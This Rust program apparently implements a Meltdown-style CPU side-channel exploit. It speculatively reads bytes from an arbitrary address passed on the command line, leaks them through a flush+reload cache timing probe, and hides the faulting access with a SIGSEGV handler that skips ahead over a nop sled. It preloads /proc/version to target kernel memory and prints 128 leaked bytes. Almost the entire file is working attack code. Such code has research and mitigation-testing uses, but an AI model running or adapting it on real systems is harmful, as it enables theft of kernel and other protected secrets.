#![feature(asm)]

use nix::sys::mman;
use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};

const MULTIPLE_OFFSET: usize = 8192;
const CACHE_LINE_SIZE: usize = 4096;
const NB_TIMES: usize = 1000;
const ZERO_TRESHOLD: usize = 970;

static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
    [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
static mut LATENCIES: [u64; 256] = [0; 256];

static mut BASE_ADDR: usize = 0;
static mut NB_CYCLES: u64 = 0;

#[inline]
fn measure_time_to_read(address: usize) -> u64 {
    let delta_tsc;
    unsafe {
        asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
             "movzx r9, byte ptr [{0}]",
             "mfence", "lfence",  "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
             in(reg) address,
             out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
    }

    delta_tsc
}

extern "C" fn handle_sigsegv(
    signal: libc::c_int,
    info: *mut libc::siginfo_t,
    arg: *mut libc::c_void,
) {
    let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
    /*
    let offending_address =
        unsafe { (*info)._pad[1] as usize | (((*info)._pad[2] as usize) << 32) };
    println!(
        "Got {:?} with offending_addres 0x{:x}, ignoring",
        Signal::try_from(signal).unwrap(),
        offensing_address
    );
    */
    // overwrite RIP to jump to our trampoline (REG_RIP = 16)
    // 15 is the width needed to encode the instructions in release mode,
    // let's set it to 25 and be done with it!
    context.uc_mcontext.gregs[16] += 25;
}

#[inline]
unsafe fn measure_byte() -> Option<u8> {
    for i in 0..256 {
        let count_addr = BASE_ADDR as usize + i * MULTIPLE_OFFSET;
        LATENCIES[i] = measure_time_to_read(count_addr);
    }

    LATENCIES
        .iter()
        .enumerate()
        .min_by(|(_, x), (_, y)| x.cmp(y))
        // the access should take less than NB_CYCLES CPU cycles
        .filter(|(_, &x)| x < NB_CYCLES)
        .map(|(x, _)| x as u8)
}

unsafe fn perform_access(
    preload_op: unsafe fn(),
    target_adress: *const u8,
    nb_bytes: usize,
) -> Vec<u8> {
    sigaction(
        Signal::SIGSEGV,
        &SigAction::new(
            SigHandler::SigAction(handle_sigsegv),
            SaFlags::empty(),
            SigSet::empty(),
        ),
    )
    .unwrap();

    let mut res: Vec<u8> = Vec::with_capacity(nb_bytes);

    for i in 0..nb_bytes {
        let mut histogram = [0usize; 256];

        for _ in 0..NB_TIMES {
            // prelaod data
            preload_op();

            // flush
            for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
                core::arch::x86_64::_mm_clflush(
                    (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
                );
            }

            let train_addr = &TEST_ARR[0] as *const u8 as usize;
            let target_adress = target_adress as usize + i;

            asm!(
                "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]", 
                "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rcx, byte ptr [rax]",
                 // nop sled for the signal handler to skip the access upon segfault
                 "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
                 in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rbx") _, inout("rcx") train_addr => _, out("rax") _);

            let leaked_byte = measure_byte().unwrap_or(0);
            histogram[leaked_byte as usize] += 1;
        }

        if histogram[0] > ZERO_TRESHOLD {
            res.push(0);
        } else {
            res.push(
                histogram[1..]
                    .iter()
                    .enumerate()
                    .max_by(|(_, x), (_, y)| x.cmp(y))
                    .map(|(x, _)| x as u8 + 1)
                    .unwrap(),
            )
        }
    }

    res
}

fn read_ptr(preload_op: unsafe fn(), target_adress: usize) -> usize {
    let vec = unsafe { perform_access(preload_op, target_adress as *const u8, 8) };
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

unsafe fn trash_cache(base: usize, nb: usize, multiplier: usize) {
    sigaction(
        Signal::SIGSEGV,
        &SigAction::new(
            SigHandler::SigAction(handle_sigsegv),
            SaFlags::empty(),
            SigSet::empty(),
        ),
    )
    .unwrap();

    for i in 0..nb {
        asm!(
            "imul rax, {1}", "add rax, {0}", "mov rax, qword ptr [rax]",
            "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
            "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
            in(reg) base, in(reg) multiplier, inout("rax") i => _
        );
    }
}

fn main() {
    // setup
    unsafe {
        let base_addr = TEST_ARR.as_ptr() as usize;
        // align on a cache line size
        BASE_ADDR =
            (base_addr + 4096 + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);

        // prefetch
        for i in 0..TEST_ARR.len() {
            TEST_ARR[i] = 127;
        }

        std::ptr::read_volatile(BASE_ADDR as *const u8);
        let mut read_cached_time = 0;
        for _ in 0..100 {
            read_cached_time += measure_time_to_read(BASE_ADDR);
        }
        read_cached_time /= 100;

        let mut read_flushed_time = 0;
        for _ in 0..100 {
            std::arch::x86_64::_mm_clflush(BASE_ADDR as *mut u8);
            read_flushed_time += measure_time_to_read(BASE_ADDR);
        }
        read_flushed_time /= 100;

        NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 3;

        println!(
            "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
            read_cached_time, read_flushed_time, NB_CYCLES
        );
    };

    let args = std::env::args().collect::<Vec<String>>();
    let addr = usize::from_str_radix(&args[1][2..], 16).unwrap();

    unsafe {
        let bytes = perform_access(
            || {
                std::fs::read_to_string("/proc/version").unwrap();
            },
            addr as *const u8,
            128,
        );
        println!("{:?}", bytes);
        println!("{}", std::str::from_utf8_unchecked(&bytes));
    }
}
